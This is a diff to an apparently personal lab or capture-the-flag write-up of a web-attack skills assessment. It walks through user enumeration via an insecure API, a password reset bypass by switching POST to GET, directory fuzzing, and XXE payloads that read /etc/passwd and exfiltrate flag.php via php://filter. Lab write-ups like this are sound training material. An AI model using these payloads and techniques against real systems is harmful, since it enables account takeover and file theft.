@@ -1104,6 +1104,7 @@ I choose to use CDATA. So the first thing I do is:
 Then:
 `python3 -m http.server 8000`
 
+
 Then I define this in the request:
 ```
 <!DOCTYPE email [
@@ -1291,5 +1292,156 @@ I also this in the header of the logout page:
 /profile.php?logout=1
 
 So lets try to logout other numbers.
+
+That doesn't seem to do anything.
+
+The reset password function is in plain text on the settings page.
+``` javascript
+       function resetPassword() {
+            if ($("#new_password").val() == $("#confirm_new_password").val()) {
+                $("#error_string").html('');
+                fetch(`/api.php/token/${$.cookie("uid")}`, {
+                    method: 'GET'
+                }).then(function(response) {
+                    return response.json();
+                }).then(function(json) {
+                    fetch(`/reset.php`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: `uid=${$.cookie("uid")}&token=${json['token']}&password=${$("#new_password").val()}`
+                    }).then(function(response) {
+                        return response.text();
+                    }).then(function(res) {
+                        $("#error_string").html(res);
+                    });
+                });
+            } else {
+                $("#error_string").html('Passwords do not match!');
+            }
+        };
+```
+
+This line is interesting:
+`fetch(`/api.php/token/${$.cookie("uid")}`
+
+If I open this page: http://94.237.49.212:47642/api.php/token/1 
+I get: {"token":"e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c"}
+
+So I can use this to reset the password for uid 1. But now I need to what the username for this user is.
+
+I also notice that this on the main page:
+``` javascript
+        $(document).ready(function() {
+            fetch(`/api.php/user/${$.cookie("uid")}`, {
+                method: 'GET'
+            }).then(function(response) {
+                return response.json();
+            }).then(function(json) {
+                $("#full_name").html(json['full_name']);
+                $("#company").html(json['company']);
+            });
+        });
+```
+
+Low and behold if I got here `http://94.237.49.212:47642/api.php/user/1`
+I get this: {"uid":"1","username":"s.applewhite","full_name":"Samanta Applewhite","company":"Daniel Inc"}
+
+So lets enumerate users, find the one we want then reset their password.
+
+``` bash
+#!/bin/bash
+
+for i in {1..1000}; do
+  curl "http://94.237.49.212:47642/api.php/user/$i"
+  echo ""
+done
+```
+
+Seems like there are only 100 users. But none jump out to me as admins...
+
+I could just change all of their passwords then try and login and review the pages for each...
+
+First I might change uid 1 since that would probably be the first user created so might be admin.
+
+Passing this to reset.php:
+`uid=1&token=e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c&password=Password1`
+
+I get access denied...
+
+This comes down to this portion I think:
+``` javascript
+                    fetch(`/reset.php`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: `uid=${$.cookie("uid")}&token=${json['token']}&password=${$("#new_password").val()}`
+```
+
+It uses the uid from the cookie, not the passed in uid. However, when I change that to uid 1 as well it fails. So then I remove PHPSESSID and the result is still Access Denied. But I do have a different cookie value now. `3f48lb8f49cpd2ogalus9sof2e`
+Old: `2ovj4or20pkijuvi6cluebjcan`
+
+Sending with that doesn't work either though.
+
+I am going to fuzz for other pages maybe.
+
+`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.49.212:47642/FUZZ -recursion -recursion-depth 1 -e .php -v -ic`
+
+Theres a couple pages I haven't seen before. event.php and config.php. But neither have anything on them. event.php just takes me back to the same page.
+
+The reset php is using a post request... maybe I could switch it to another submit type.
+
+Hey would you look at that. Using get worked on uid=1.
+
+Looking at the list of users again I actually see this:
+`{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}`
+
+So lets reset that password and get my privileged user.
+
+` {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"} `
+
+Now the event.php page works.
+
+The event.php calls addEvent.php which has this xml:
+``` xml
+            <root>
+            <name>test</name>
+            <details>test</details>
+            <date>2024-06-03</date>
+            </root>
+```
+
+Lets try XXEinjector.rb
+
+`ruby XXEinjector.rb --host=10.10.14.107 --httpport=8000 --file=WebAttacks_SkillAssement.test --path=/addEvent.php --oob=http --phpfilter`
+
+XXEInjector failed. But I can easily get an LFI working doing this:
+
+``` xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+            <root>
+            <name>
+&company;
+</name>
+            <details>test</details>
+            <date>2024-06-03</date>
+            </root>
+```
+
+So now the question is how to get flag.php file.
+
+Lets try the simple way first:
+
+``` xml
+<!DOCTYPE name [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+]>
+```
+
+And that worked. Good deal.
 
 
